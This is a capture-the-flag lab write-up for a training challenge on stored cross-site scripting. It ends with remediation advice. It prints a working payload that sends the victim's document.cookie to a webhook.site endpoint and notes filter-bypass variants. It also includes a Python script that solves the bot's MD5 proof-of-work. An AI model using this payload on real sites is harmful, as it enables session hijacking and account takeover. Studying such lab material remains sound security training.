### Curious George, stored XSS and cookie theft

The subsequent practical exercise, designated Curious George, focuses on the exploitation of a persistent vulnerability, accessible for the laboratory session at [https://training.olicyber.it/challenges#challenge-40](https://www.google.com/search?q=https://training.olicyber.it/challenges%23challenge-40). The target application functions as a minimal profile hosting platform, where each authenticated user is allocated a personal profile page accessible via a unique identifier, featuring an editable description field that serves as the primary injection sink for the malicious payload. Furthermore, the application incorporates a vulnerability reporting mechanism located at the dedicated bug page, allowing users to submit a Uniform Resource Locator to an automated administrative bot, which simulates a highly privileged user visiting the specified page, provided a cryptographic proof of work is successfully completed.

To effectively capture the stolen session material, the attacker must first establish an external data collection endpoint, such as the public service available at [https://webhook.site](https://webhook.site/), which provisions a unique receiving address alongside a live monitoring interface for incoming requests. Upon verifying that the profile description is rendered directly into the HTML document without appropriate output sanitization, the attacker must craft a payload designed to read the document cookie and transmit it to the webhook endpoint, utilizing the Fetch Application Programming Interface constructed strictly as follows:



```HTML
<script>fetch('https://webhook.site/your-uuid?c='+document.cookie)</script>
```

> Equivalent execution vectors operate within slightly different contexts, such as image elements utilizing onerror handlers or the navigator beacon interface, which prove absolutely essential to understand because they provide reliable alternatives when explicit script tags are filtered by the server defense mechanisms.

Before the administrative bot processes the submission, the attacker must satisfy the rate limiting mechanism implemented as the aforementioned proof of work, requiring the identification of a byte string whose MD5 hash matches a displayed hexadecimal prefix. The provided Python script automates the discovery of this partial hash collision, allowing the attacker to submit the resulting string and hash alongside the malicious profile link, thereby forcing the bot to visit the infected profile and execute the stored payload unconditionally.

The script: 

```python
from hashlib import md5
from sys import argv, exit
import os

def collide(coll):
    while True:
        s = os.urandom(20)
        h = md5(s).hexdigest()
        if h[:len(coll)] == coll:
            print(f"String: {s.hex()}")
            print(f"Hash: {h}")
            break

if __name__ == "__main__":
    if len(argv) != 2:
        print(f"Usage:\t{argv[0]} <PARTIAL-COLLISION>")
        exit(-1)
    tocoll = argv[1]
    print("Colliding stars...")
    collide(tocoll)
    exit(0)
```

This sequence represents the canonical stored Cross-Site Scripting attack chain, emphasizing that the fundamental structural remediation requires context-aware HTML encoding of the description field upon output, which prevents the payload from being parsed as an executable tag. Additionally, setting the HttpOnly flag on the session cookie would provide a critical layer of defense in depth, because it instructs the browser to prevent JavaScript access to the token, completely blocking this specific exfiltration route and forcing the adversary to explore more complex post exploitation techniques.

<img src="_attachments/Curious%20George%20-%20stored%20XSS%20and%20cookie%20theft.png" width="400">

<img src="_attachments/Curious%20George%20-%20stored%20XSS%20and%20cookie%20theft_1.png" width="400">

The admin access to the profile page that conveys the session-id to the malicious endpoint:

<img src="_attachments/Curious%20George%20-%20stored%20XSS%20and%20cookie%20theft_2.png" width="400">

<img src="_attachments/Curious%20George%20-%20stored%20XSS%20and%20cookie%20theft_3.png" width="400">